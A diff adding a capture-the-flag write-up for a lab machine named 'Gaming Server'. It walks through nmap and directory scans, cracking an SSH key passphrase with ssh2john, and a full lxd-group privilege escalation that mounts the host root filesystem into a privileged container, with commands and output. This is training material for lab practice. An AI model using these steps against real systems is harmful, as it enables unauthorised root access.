@@ -1,0 +1,89 @@
+Gaming Server Writeup
+
+Begin by scanning the server
+
+nmap -sV -sC gserv.thm
+
+ports 22 and 80 are open for ssh connections and a web server
+lets go ahead and start a dirbuster scan
+
+dirbuster dir -u http://gserv.thm -w /usr/share/wordlists/dirb/common.txt
+
+meanwhile we will go to the website and try to explore manually and see what we can find
+
+looking at the source code for the front page finds us a comment of interest at the bottom of the page
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+so we have a user to possibly compromise, john
+
+on the about.html page looking at the source code will reveal a upload directory
+inside are 3 files with the one of interest being dict.lst which seems to be a possible wordlist for future use
+
+by this point our dirbuster scan had completed/found us a directory, secret to explore
+upon checking the directory a secretKey file that appears to be a id_rsa private key
+using this secretKey lets attempt to ssh as the assumed user john with the key
+chmod 600 secretKey
+ssh -i secretKey john@gserv.thm
+
+seems like we still need a passcode for the secretKey
+
+we can simply use ssh2john, and lets go ahead and put the possible wordlist we found to use
+
+ssh2john secretKey > hash
+john hash -w=dict.lst
+
+the passcode is found very quickly and we can proceed to ssh and connect succesfully
+
+we can grab the user flag in john's home directory
+
+running sudo -l is available but we don't have john password to view let alone actually complete a sudo command
+
+lets do some other checks
+cat /etc/crontab to check for cronjobs
+find / -type f -perm -4000 2>/dev/null
+
+nothing out of the ordinary
+at this point I was about ready to upload linpeas to automate looking for an attack vector when I decided to check the tags on the room
+lxd, or linux containers is listed as a tag.
+id reveals that the john user is a member of the lxd group which provides an attack vector
+
+john@exploitable:/dev/shm$ lxc image list
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+
+no images are present so lets upload one
+
+on our local system 
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+$ cd lxd-alpine-builder
+$ ./build-alpine
+
+this will result in a tar.gz file we will upload onto the system and the import via the command
+
+john@exploitable:/tmp$ lxc image import alpine-v3.12-x86_64-20200830_2315.tar.gz --alias myalpine
+Image imported with fingerprint: dad2e15edfb8e86142c984279fe12d4af14bb32061c2704b5283ddd09fd63c9e
+
+john@exploitable:/tmp$ lxc image list
++----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myalpine | dad2e15edfb8 | no     | alpine v3.12 (20200830_23:15) | x86_64 | 3.05MB | Aug 31, 2020 at 6:16am (UTC) |
++----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+
+We are going to attempt to mount the root directory onto the container giving us access to the root directory. We will create the container with security privileges. then mount the root file system on /mnt to gain access as follows.
+
+john@exploitable:/tmp$ lxc init myalpine john -c security.privileged=true
+Creating john
+
+john@exploitable:/tmp$ lxc config device add john mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to john
+
+john@exploitable:/tmp$ lxc start john
+john@exploitable:/tmp$ lxc exec john /bin/sh
+~ # whoami
+root
+
+we can read the root flag
+cat /mnt/root/root/root.txt
+
+
